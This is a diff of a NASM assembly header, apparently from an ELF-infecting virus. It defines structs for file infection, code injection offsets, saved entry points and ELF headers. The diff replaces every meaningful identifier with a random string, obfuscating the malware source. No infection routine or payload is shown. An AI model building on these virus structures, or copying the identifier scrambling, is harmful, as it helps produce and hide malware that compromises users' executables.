@@ -56,39 +56,39 @@
 %define FINJMP_OFF (_bf_exit - _start)
 %define PAGE_SIZE 0x1000
 
-%define FAM(x) [(rbp - pestilence_size) + x]
+%define FAM(x) [(rbp - zaxqU_size) + x]
 %define SOCK(x) [(rbp - sock_size) + x]
-%define INF(x) [(rbp - infection_size) + x]
+%define INF(x) [(rbp - dAPpbn4f_size) + x]
 
 %define CODE_LEN (_end - _start)
 %define FINJMP_OFF (_bf_exit - _start)
 %define PAGE_SIZE 0x1000
 
-struc pestilence
-.pwd resb PAGE_SIZE
-.dirents: resb PAGE_SIZE
-.fd resq 1
-.total_read: resd 1
-.total_to_read: resd 1
-.dirents_struct_ptr resq 1
+struc zaxqU
+.FPujDQ resb PAGE_SIZE
+.E5lKIwxWY: resb PAGE_SIZE
+.jO0nhaBOO resq 1
+.Ho9CRF: resd 1
+.jBWpi8PVtD: resd 1
+.V88zofCZD resq 1
 endstruc
 
-struc infection
-.file_fd resq 1
-.map_addr resq 1
-.map_size resq 1
-.seg_nb resb 1
-.seg_hdr_addr resq 1
-.last_seg_hdr_addr resq 1
-.injection_offset resq 1
-.injection_addr resq 1
-.sec_hdr_addr resq 1 
-.original_entry resq 1
-.original_end resq 1
-.add_page resb 1
-.mem_eof resq 1
-.shstrtab_addr resq 1
-.got_str_index resq 1
+struc dAPpbn4f
+.I3N1qWMGEF resq 1
+.ZcFHcI resq 1
+.oTlKX resq 1
+.rdEHTCOmK resb 1
+.e75FLCIy resq 1
+.RPBLbBHlr resq 1
+.kQsSjHTL resq 1
+.j58wDKr resq 1
+.HjVxtI resq 1 
+.zeLO1lqksJ resq 1
+.zs3Dkg0aQ7 resq 1
+.nUJx2 resb 1
+.oTLzDWWOP resq 1
+.o3tt58G9h resq 1
+.HW9ycoiSF resq 1
 endstruc
 
 ; ELF structures
@@ -103,45 +103,45 @@ endstruc
 %define SHF_ALLOC 0x2
 %define SHF_EXECINSTR 0x4
 
-struc elf64_ehdr
-.e_ident: resb 16
-.e_type: resw 1
-.e_machine: resw 1
-.e_version: resd 1
-.e_entry: resq 1
-.e_phoff: resq 1
-.e_shoff: resq 1
-.e_flags: resd 1
-.e_ehsize: resw 1
-.e_phentsize: resw 1
-.e_phnum: resw 1
-.e_shentsize: resw 1
-.e_shnum: resw 1
-.e_shstrndx: resw 1
+struc bWWD5jh
+.OGtcP: resb 16
+.OWDliJN6C: resw 1
+.RECZ6: resw 1
+.phCyuML: resd 1
+.POtz1x: resq 1
+.XKlQRh6: resq 1
+.hmDFAvEgk: resq 1
+.JDhX9rAKF: resd 1
+.Yg1T9PI: resw 1
+.D74n1: resw 1
+.xMNdNqd9K: resw 1
+.qbknFv: resw 1
+.Qvqny1P: resw 1
+.gtTDggknp: resw 1
 endstruc
 
-struc elf64_phdr
-.p_type: resd 1
-.p_flags: resd 1
-.p_offset: resq 1
-.p_vaddr: resq 1
-.p_paddr: resq 1
-.p_filesz: resq 1
-.p_memsz: resq 1
-.p_align: resq 1
+struc WoV51z
+.uYFL0Z: resd 1
+.mvGjDFFQdS: resd 1
+.TjEnfr: resq 1
+.EyMbEwRr: resq 1
+.mXwGU: resq 1
+.sQ2QfPi: resq 1
+.dfgrvok: resq 1
+.Ne43wWnme: resq 1
 endstruc
 
-struc elf64_shdr
-.sh_name: resd 1
-.sh_type: resd 1
-.sh_flags: resq 1
-.sh_addr: resq 1
-.sh_offset: resq 1
-.sh_size: resq 1
-.sh_link: resd 1
-.sh_info: resd 1
-.sh_addralign resq 1
-.sh_entsize resq 1
+struc obwyis6Pw
+.PQUP5es: resd 1
+.R1ttog: resd 1
+.bIPrt: resq 1
+.l0NJ4jXSvG: resq 1
+.lqI8a: resq 1
+.dZdpaD: resq 1
+.vL08Bjwwun: resd 1
+.EhP6yxbEh: resd 1
+.sY2AfrGM resq 1
+.uFtFwIlj resq 1
 endstruc
 
 %macro PUSHA 0
